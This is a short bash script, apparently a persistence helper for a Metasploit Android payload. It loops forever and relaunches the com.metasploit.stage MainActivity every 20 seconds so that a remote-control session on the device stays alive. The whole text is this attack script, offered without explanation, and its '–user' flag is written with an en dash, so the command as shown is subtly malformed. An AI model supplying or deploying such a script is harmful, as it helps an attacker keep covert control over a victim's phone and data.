#!/bin/bash
while :
do am start –user 0 -a android.intent.action.MAIN -n com.metasploit.stage/.MainActivity
sleep 20
done